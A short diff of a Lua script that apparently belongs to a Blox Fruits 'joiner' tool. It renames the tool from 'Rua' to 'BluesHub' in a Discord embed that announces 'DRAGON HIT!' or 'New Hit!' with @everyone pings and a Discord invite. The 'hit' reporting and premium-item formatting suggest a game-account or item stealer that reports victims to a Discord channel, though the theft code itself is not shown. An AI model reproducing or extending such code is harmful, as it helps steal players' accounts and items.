@@ -581,7 +581,7 @@ local function formatPremiumItems()
 end
 
 local embed = {
-    title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
+    title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "BluesHub BF Joiner ; https://discord.gg/zJKDqRd5",
     description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
     color = hasDragonFruit and 0xFF0000 or 0x00FF00,
     fields = {
